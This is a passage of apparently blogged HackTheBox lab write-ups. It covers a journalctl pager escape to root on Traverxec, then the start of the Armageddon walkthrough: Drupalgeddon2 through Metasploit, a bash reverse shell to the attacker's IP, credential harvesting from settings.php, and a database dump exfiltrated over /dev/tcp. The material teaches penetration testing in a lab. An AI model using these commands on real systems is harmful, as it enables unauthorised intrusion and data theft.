</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              &#39;&#34;&#34;)---(&#34;&#34;&#39; |___.|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                             /:::::::::::\&#34;    &#34;</span>
</span></span><span class="line"><span class="cl">                                                            /:::<span class="o">=======</span>:::<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>                                                        jgs <span class="s1">&#39;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#39;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Load:  18:24:49 up 17:04,  <span class="m">1</span> user,  load average: 0.13, 0.04, 0.01
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Open nhttpd sockets: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Files in the docroot: <span class="m">117</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">Last <span class="m">5</span> journal log lines:
</span></span><span class="line"><span class="cl">-- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. --
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:02 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nv">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span><span class="m">33</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span> <span class="nv">tty</span><span class="o">=</span>/dev/pts/0 <span class="nv">ruser</span><span class="o">=</span>www-data <span class="nv">rhost</span><span class="o">=</span>  <span class="nv">user</span><span class="o">=</span>www-data
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: conversation failed
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: pam_unix<span class="o">(</span>sudo:auth<span class="o">)</span>: auth could not identify password <span class="k">for</span> <span class="o">[</span>www-data<span class="o">]</span>
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec sudo<span class="o">[</span>24501<span class="o">]</span>: www-data : <span class="nb">command</span> not allowed <span class="p">;</span> <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/dev/shm <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>list
</span></span><span class="line"><span class="cl">Jul <span class="m">13</span> 17:16:04 traverxec nologin<span class="o">[</span>24564<span class="o">]</span>: Attempted login by UNKNOWN on UNKNOWN
</span></span></code></pre></div><h4 id="sudo-journalctl">Sudo journalctl</h4>
<p>Based on the contents of <code>server-stats.sh</code>, user <code>david</code> seems to be allowed to run <code>journalctl</code>  with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ cat server-stats.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cat /home/david/bin/server-stats.head
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Load: `/usr/bin/uptime`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Last 5 journal log lines:&#34;</span>
</span></span><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service <span class="p">|</span> /usr/bin/cat 
</span></span></code></pre></div><p>But, when I run <code>/usr/bin/sudo /usr/bin/journalctl</code>, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> david: 
</span></span><span class="line"><span class="cl">Sorry, try again.
</span></span></code></pre></div><p>Then, I grab this line <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> and run it. This is what I get:</p>
<p><div class="img-container"><img src="imgs/image-20210714052617836.png" alt="image-20210714052617836"  /></div>
</p>
<p>That means I can run the following command with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
</span></span></code></pre></div><p>According to the <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a>, the default pager of <code>journalctl</code> is <code>less</code>. Now since it runs with root privilege, I can escape from the pager using  <code>!/bin/bash</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210714054042963.png" alt="image-20210714054042963"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Armageddon</title>
      <link>https://fahmifj.github.io/hackthebox/armageddon/</link>
      <pubDate>Mon, 26 Jul 2021 11:21:43 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/armageddon/</guid>
      <description>Pwning Drupal 7 CMS with Drupalgeddon and abusing Snap with malicious snap package</description>
      <content:encoded><![CDATA[<p>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials which then used to retrieve user credentials from the database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Drupal 7 exploitation using Drupalgeddon2</li>
<li>Privilege escalation via malicious snap package</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
<li><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">Dirty_sockv2.py</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial <code>nmap</code> scan discovers two open ports: SSH on 22 and an Apache Web Server serving Drupal 7 on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «armageddon» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA scans/10-initial-armageddon 10.129.90.96
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-29 22:27 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.90.96
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
</span></span><span class="line"><span class="cl"><span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
</span></span><span class="line"><span class="cl"><span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Mon Mar 29 22:28:01 2021 -- 1 IP address (1 host up) scanned in 51.04 seconds</span>
</span></span></code></pre></div><p>Nmap also identified the OS as CentOs, so there is a chance that it would only allow outgoing connection to ports below 1024.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80----website">TCP 80 -  Website</h3>
<p>Visiting port 80 presents a page that has no other content except a login form.</p>
<p><div class="img-container"><img src="imgs/image-20210330094613154.png" alt="image-20210330094613154"  /></div>
</p>
<p>A previous <code>nmap</code> scan detected that there was a changelog file. Poking <code>/CHANGELOG.txt</code> discovers the exact version of this Drupal instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «armageddon» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.129.90.96/CHANGELOG.txt 
</span></span><span class="line"><span class="cl">Drupal 7.56, 2017-06-21
</span></span><span class="line"><span class="cl">-----------------------
</span></span><span class="line"><span class="cl">- Fixed security issues <span class="o">(</span>access bypass<span class="o">)</span>. See SA-CORE-2017-003.
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p><code>searchsploit</code> pops up a lot of exploit results related to Drupal 7. But, based on the results, it is clear that the current version of Drupal seems to be vulnerable to remote code execution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «armageddon» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ searchsploit Drupal <span class="m">7</span>
</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                     <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span>                  <span class="p">|</span> php/webapps/34992.py
</span></span><span class="line"><span class="cl">Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span>                   <span class="p">|</span> php/webapps/44355.php
</span></span><span class="line"><span class="cl">Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>        <span class="p">|</span> php/webapps/34984.py
</span></span><span class="line"><span class="cl">Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>        <span class="p">|</span> php/webapps/34993.php
</span></span><span class="line"><span class="cl">Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Remote Code Execution<span class="o">)</span>           <span class="p">|</span> php/webapps/35150.php
</span></span><span class="line"><span class="cl">Drupal 7.12 - Multiple Vulnerabilities                                             <span class="p">|</span> php/webapps/18564.txt
</span></span><span class="line"><span class="cl">Drupal 7.x Module Services - Remote Code Execution                                 <span class="p">|</span> php/webapps/41564.php
</span></span><span class="line"><span class="cl">Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                            <span class="p">|</span> php/webapps/3313.pl
</span></span><span class="line"><span class="cl">Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
</span></span><span class="line"><span class="cl">Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
</span></span><span class="line"><span class="cl">Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>           <span class="p">|</span> php/webapps/44557.rb
</span></span><span class="line"><span class="cl">Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>        <span class="p">|</span> php/webapps/44542.txt
</span></span><span class="line"><span class="cl">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
</span></span><span class="line"><span class="cl">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
</span></span><span class="line"><span class="cl">Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>Metasp <span class="p">|</span> php/remote/44482.rb
</span></span><span class="line"><span class="cl">Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>   <span class="p">|</span> php/webapps/44448.py
</span></span><span class="line"><span class="cl">Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Exe <span class="p">|</span> php/remote/46510.rb
</span></span><span class="line"><span class="cl">Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                     <span class="p">|</span> php/webapps/46452.txt
</span></span><span class="line"><span class="cl">Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                 <span class="p">|</span> php/webapps/46459.py
</span></span><span class="line"><span class="cl">Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                  <span class="p">|</span> php/webapps/44501.txt
</span></span><span class="line"><span class="cl">Drupal Module CKEditor &lt; 4.1WYSIWYG <span class="o">(</span>Drupal 6.x/7.x<span class="o">)</span> - Persistent Cross-Site Scrip <span class="p">|</span> php/webapps/25493.txt
</span></span><span class="line"><span class="cl">Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                      <span class="p">|</span> php/remote/40144.php
</span></span><span class="line"><span class="cl">Drupal Module Cumulus 5.x-1.1/6.x-1.4 - <span class="s1">&#39;tagcloud&#39;</span> Cross-Site Scripting            <span class="p">|</span> php/webapps/35397.txt
</span></span><span class="line"><span class="cl">Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                  <span class="p">|</span> php/remote/40130.rb
</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>Since &ldquo;Drupalgeddon2&rdquo; exploits doesn&rsquo;t state it requires authentication, I will give it a try.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-apache">Shell as apache</h3>
<h4 id="metasploit---drupalgeddon-2">Metasploit - Drupalgeddon 2</h4>
<p>Metasploit has a module for Drupalgeddon2 ( <code>exploit/unix/webapp/drupal_drupalgeddon2</code>). On my first attempt, it returned with no session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.129.90.96
</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.129.90.96
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:9001 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created
</span></span></code></pre></div><p>By assuming that the firewall blocks all outgoing ports except for well-known, I changed my listener port to 443, and now it successfully opened a session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">443</span>
</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">443</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:443 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39282</span> bytes<span class="o">)</span> to 10.129.90.96
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.4:443 -&gt; 10.129.90.96:44612<span class="o">)</span> at 2021-03-29 23:47:59 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process <span class="m">9611</span> created.
</span></span><span class="line"><span class="cl">Channel <span class="m">0</span> created.
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">apache
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html
</span></span></code></pre></div><p>I sent the following command because I wanted to change my shell, so I could do the PTY trick to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/88 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «armageddon» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span>  
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58422</span>
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">bash-4.2$ 
</span></span></code></pre></div><p>However, I&rsquo;m unable to get the PTY trick working. It always returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 154, in spawn
</span></span><span class="line"><span class="cl">    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 96, in fork
</span></span><span class="line"><span class="cl">    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 29, in openpty
</span></span><span class="line"><span class="cl">    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 59, in _open_terminal
</span></span><span class="line"><span class="cl">    raise OSError<span class="o">(</span><span class="s1">&#39;out of pty devices&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">OSError: out of pty devices
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-brucetherealadmin">Shell as brucetherealadmin</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There is only one user other than root who has a login shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
</span></span></code></pre></div><p>Running a recursive grep to find passwords under the web root directory pops one password out from <code>settings.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html
</span></span><span class="line"><span class="cl">bash-4.2$ grep -Ri <span class="s2">&#34;password&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">sites/default/settings.php:      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>Looking at the contents of  <code>settings.php</code> reveals a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ cat sites/default/settings.php
</span></span><span class="line"><span class="cl"><span class="nv">$databases</span> <span class="o">=</span> array <span class="o">(</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="cl">  array <span class="o">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="cl">    array <span class="o">(</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupal&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupaluser&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;port&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;driver&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysql&#39;</span>,
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;prefix&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
</span></span><span class="line"><span class="cl">    <span class="o">)</span>,
</span></span><span class="line"><span class="cl">  <span class="o">)</span>,
</span></span><span class="line"><span class="cl"><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><h4 id="mysql-access">MySQL Access</h4>
<p>The password didn&rsquo;t work for user <code>brucetherealadmin</code>, but it did work for the database (of course). Unfortunately, because I&rsquo;m not in a TTY, I couldn&rsquo;t get into MySQL interactive shell, so instead, I dumped the database using <code>mysqldump</code> and exfiltrated the output to my attacking machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.2$ mysqldump -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal &gt; drupal.dump<span class="p">;</span> cat drupal.dump &gt; /dev/tcp/10.10.14.4/88
</span></span></code></pre></div><p>On my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span> &gt; drupal.dump
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58444</span>
</span></span></code></pre></div><p>Examination of the dumped data reveals the structure of  <code>users</code> table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
